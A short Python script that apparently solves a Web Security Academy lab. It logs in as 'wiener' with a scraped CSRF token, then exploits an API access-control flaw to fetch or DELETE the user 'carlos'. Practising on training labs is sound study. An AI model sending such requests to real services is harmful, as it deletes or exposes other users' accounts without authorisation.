import requests 
from bs4 import BeautifulSoup

# Login
def lab_login(url, login):

    # Getting CSRF Token
    s = requests.Session()
    r = s.get(url + login)
    p = BeautifulSoup(r.content, "lxml")

    csrf = p.find(attrs = {'name' : 'csrf'})['value']

    data = {
        "csrf": csrf,
        "username": "wiener",
        "password": "peter"
    }

    r = s.post(url + login, data=data)

    return s.cookies.get_dict()

def get_api(url, login, api):
    session = lab_login(url, login)

    r = requests.get(url+api+"/user/carlos", cookies=session)
    return r.text

def get_delete(url, login, api):
    session = lab_login(url, login)
    username = "carlos"

    r = requests.delete(url+api+"/user/"+username, cookies=session)
    return r.status_code, r.text

if __name__ == '__main__':
    url = "https://0a5900ab049e5834bf19ddb6002f0000.web-security-academy.net"
    login = "/login"
    api = "/api"

    # print(get_api(url, login, api))
    print(get_delete(url, login, api))

    


